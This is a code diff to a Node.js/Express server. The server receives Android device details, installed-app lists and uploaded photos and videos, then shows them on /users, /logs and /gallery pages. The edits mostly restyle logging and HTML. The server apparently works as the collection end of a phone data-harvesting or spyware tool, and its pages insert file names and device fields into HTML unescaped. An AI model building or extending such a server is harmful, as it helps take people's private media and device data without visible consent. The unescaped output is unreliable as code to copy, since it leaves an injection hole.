@@ -32,15 +32,12 @@ function loadConfig() {
 
 function isAllowed(req, type) {
   const cfg = loadConfig();
-
   const ip = getIP(req);
   const model = req.query.model || "";
 
   if (!cfg.enabled) return false;
-
   if (type === "track" && !cfg.send_device_info) return false;
   if (type === "upload" && !cfg.send_files) return false;
-
   if (cfg.blocked_ips?.includes(ip)) return false;
   if (cfg.blocked_models?.includes(model)) return false;
 
@@ -57,11 +54,8 @@ function parseBody(body) {
   const obj = {};
   body.split("&").forEach(pair => {
     const [key, value] = pair.split("=");
-    if (key && value) {
-      obj[key] = decodeURIComponent(value);
-    }
+    if (key && value) obj[key] = decodeURIComponent(value);
   });
-
   return obj;
 }
 
@@ -92,8 +86,6 @@ app.post('/track', (req, res) => {
       ? parsed.apps.split(",").map(x => x.trim()).filter(Boolean)
       : [];
 
-    // Simple heuristic:
-    // system apps usually start with android/com.android/com.google
     const systemApps = allApps.filter(a =>
       a.startsWith("android") ||
       a.startsWith("com.android") ||
@@ -109,23 +101,23 @@ app.post('/track', (req, res) => {
       model: parsed.model,
       brand: parsed.brand,
       android: parsed.android,
-
       app_count: allApps.length,
       system_apps: systemApps,
       user_apps: userApps,
-
       time: new Date().toISOString()
     };
 
+    // 🔥 Advanced Console Log (clean)
     console.log("\n📱 DEVICE =====================");
-    console.log(data);
+    console.log(`IP: ${data.ip} | ${data.brand} ${data.model} | Android ${data.android}`);
+    console.log(`Battery: ${data.battery}% | Apps: ${data.app_count} (User: ${userApps.length}, System: ${systemApps.length})`);
+    console.log("======================================");
 
     saveLog(data);
 
     res.json({ status: "ok" });
   });
 });
-      
 
 /* ================= UPLOAD ================= */
 
@@ -150,25 +142,23 @@ app.post('/upload', (req, res) => {
 
   const filePath = path.join(UPLOAD_DIR, fileName);
 
+  // 🔥 Clean log
   console.log("\n📦 FILE RECEIVED =====================");
-  console.log("Saved as:", fileName);
+  console.log(`Saved as: ${fileName}`);
+  console.log("======================================");
 
   const stream = fs.createWriteStream(filePath);
   req.pipe(stream);
 
-  stream.on('error', () => {
-    console.log("Write error");
-  });
+  stream.on('error', () => console.log("Write error"));
 
   req.on('end', () => {
 
-    const data = {
+    saveLog({
       type: "file",
       file: fileName,
       time: new Date().toISOString()
-    };
-
-    saveLog(data);
+    });
 
     res.json({ status: "uploaded", file: fileName });
   });
@@ -224,7 +214,7 @@ app.get('/users', (req, res) => {
       <b>Device:</b> ${user.brand} ${user.model}<br>
       <b>Android:</b> ${user.android}<br>
       <b>Battery:</b> ${user.battery}<br>
-      <b>Total Apps:</b> ${user.app_count || 0}<br>
+      <b>Total Apps:</b> ${user.app_count}<br>
 
       <div class="title">📱 User Apps (${user.user_apps?.length || 0})</div>
       <div class="apps">
@@ -244,11 +234,7 @@ app.get('/users', (req, res) => {
   res.send(html);
 });
 
-  
-
-  
-
-/* ================= LOG VIEW (ORDER FIX) ================= */
+/* ================= LOGS ================= */
 
 app.get('/logs', (req, res) => {
 
@@ -259,7 +245,6 @@ app.get('/logs', (req, res) => {
     .filter(Boolean)
     .map(x => JSON.parse(x));
 
-  // device first, then files
   const ordered = [
     ...logs.filter(x => x.type === "device"),
     ...logs.filter(x => x.type === "file")
@@ -284,23 +269,53 @@ app.get('/gallery', (req, res) => {
 
   let html = `
   <html>
-  <body style="background:#111;color:#fff;font-family:sans-serif">
-  <h2>Total Files: ${files.length}</h2>
+  <head>
+    <style>
+      body { background:#111; color:#fff; font-family:sans-serif; }
+      .grid { display:flex; flex-wrap:wrap; }
+      .card { margin:10px; width:220px; }
+      img, video { width:100%; border-radius:10px; background:#222; }
+      img { filter: blur(10px); transition: filter 0.4s; }
+      img.loaded { filter: blur(0); }
+      .name { font-size:12px; margin-top:5px; word-break:break-all; }
+    </style>
+  </head>
+  <body>
+    <h2>Total Files: ${files.length}</h2>
+    <div class="grid">
   `;
 
   files.reverse().forEach(file => {
+
     const url = `/uploads/${file}`;
 
     if (file.endsWith(".jpg") || file.endsWith(".png")) {
-      html += `<img src="${url}" width="200"><br>`;
+      html += `
+        <div class="card">
+          <img src="${url}" loading="lazy" onload="this.classList.add('loaded')" />
+          <div class="name">${file}</div>
+        </div>
+      `;
     } else if (file.endsWith(".mp4")) {
-      html += `<video src="${url}" controls width="200"></video><br>`;
+      html += `
+        <div class="card">
+          <video controls preload="metadata">
+            <source src="${url}" type="video/mp4">
+          </video>
+          <div class="name">${file}</div>
+        </div>
+      `;
     } else {
-      html += `<a href="${url}">${file}</a><br>`;
+      html += `
+        <div class="card">
+          <a href="${url}" target="_blank">${file}</a>
+        </div>
+      `;
     }
+
   });
 
-  html += "</body></html>";
+  html += `</div></body></html>`;
 
   res.send(html);
 });
